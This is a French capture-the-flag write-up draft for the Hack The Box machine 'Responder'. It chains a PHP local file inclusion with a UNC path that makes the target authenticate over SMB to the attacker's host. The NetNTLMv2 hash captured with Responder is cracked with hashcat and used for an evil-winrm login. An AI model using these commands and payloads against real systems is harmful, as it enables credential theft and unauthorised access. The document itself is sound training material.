---
# Imported from Obsidian: HTB/Writeup --- Responder.md
# Draft: incomplete: gets a shell but never states the flag
title: HTB Responder
category: Boot2Root
ctf: Hack The Box
date: 2026-09-03
summary: 'Le scan initial nmap révèle deux ports ouverts principaux :'
tags:
- boot2root
- hack-the-box
lang: fr
draft: true
imported: true
---

## 1. Reconnaissance & Énumération

Le scan initial `nmap` révèle deux ports ouverts principaux :

  

```bash
nmap -sC -sV -p- 10.129.186.113
```

- **Port 80 (HTTP)** : Apache 2.4.52 avec PHP 8.1.1 sur Windows (`UnikN` / domaine `unika.htb`).
         
    
- **Port 5985 (WinRM)** : Microsoft HTTPAPI httpd 2.0 (utilisé pour l'administration distante Windows).
         
    

> **Note**
> 
> Avant de continuer, ouvrir le fichier  `/etc/hosts` puis ajouter `10.129.186.113 unika.htb` pour que le site web résolve correctement.
> 
>   

## 2. Découverte de la vulnérabilité (LFI)

En naviguant sur l'application web, on remarque un paramètre gérant les langues :

  
```text
http://unika.htb/index.php?page=german.html
```

En testant ce paramètre avec des séquences de remontée de répertoire (`..\..\..\test.php`), l'application renvoie des messages d'erreur explicites du moteur PHP sous Windows :

```text
Warning: include(..\..\..\test.php): Failed to open stream: No such file or directory in C:\xampp\htdocs\index.php on line 11
```

Cela confirme la présence d'une vulnérabilité de type **LFI (Local File Inclusion)** sur un système d'exploitation Windows.

  

## 3. Capture du Hash NetNTLMv2 avec Responder

Puisque la cible tourne sous Windows, il est possible d'exploiter la gestion des chemins réseau **UNC (Universal Naming Convention)** par l'OS. Lorsque PHP tente d'inclure une ressource distante via un chemin de type `\\IP\partage\fichier`, Windows tente automatiquement de s'authentifier auprès de cette machine via le protocole SMB.

  

### Lancement de l'outil Responder

Sur notre machine d'attaque, on lance Responder pour écouter et intercepter le trafic d'authentification :

  

```bash
sudo responder -I tun0 -v
```

### Injection du payload LFI

On injecte un chemin UNC pointant vers notre adresse IP dans le paramètre vulnérable :

  

```text
http://unika.htb/index.php?page=\\10.10.14.131\partage\exploit
```

Le serveur Windows tente d'accéder au partage SMB inexistant sur notre machine, et **Responder** intercepte la requête pour capturer le hash NetNTLMv2 de l'utilisateur exécutant le service Web (`Administrator`) :

  

```text
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:1b211c22d7795248:A389EA1108552442D732E6B5900655F7:...
```

> **Rôle et fonctionnement de Responder**
> 
> **Responder** est un outil de référence en pentest interne et externe pour l'empoisonnement de protocoles de résolution de noms (LLMNR, NBT-NS, mDNS) et la simulation de services (SMB, HTTP, FTP, etc.).
> 
>   
> 
> - **Son rôle clé :** Il répond aux requêtes de résolution ou intercepte les tentatives d'accès réseau initiées par Windows.
>     
>       
>     
> - **Pourquoi ça fonctionne ici :** Même si les RFI HTTP classiques bloquent souvent à cause de `allow_url_include = Off`, Windows traite les chemins UNC comme des accès natifs de bas niveau. Responder simule un serveur SMB légitime, récupère le challenge-response (le hash NetNTLMv2) de la cible à la volée, et le stocke pour un cassage hors ligne.
>     
>       
>     

## 4. Cassage du Hash (Hashcat)

Une fois le hash sauvegardé dans un fichier `admin_hash.txt`, on utilise **Hashcat** avec le mode `5600` (spécifique au NetNTLMv2) et la wordlist `rockyou.txt` :

  

```bash
hashcat -m 5600 admin_hash.txt /usr/share/wordlists/rockyou.txt
```

Pour afficher le mot de passe décrypté :

  

```bash
hashcat -m 5600 admin_hash.txt --show
```

- **Résultat :** `Administrator::...:badminton`
    
      
    
- Le mot de passe en clair du compte administrateur est **`badminton`**.
    
      
    

## 5. Connexion et Obtention du Flag (Evil-WinRM)

Le port **5985** étant ouvert pour le service **WinRM** (Windows Remote Management), on peut s'authentifier à distance avec les identifiants récupérés en utilisant l'outil `evil-winrm` :

  

```bash
evil-winrm -i 10.129.186.113 -u Administrator -p badminton
```

Une fois connecté avec succès, on obtient un terminal interactif sur la machine Windows cible permettant de naviguer dans le système de fichiers et de récupérer le flag administrateur.
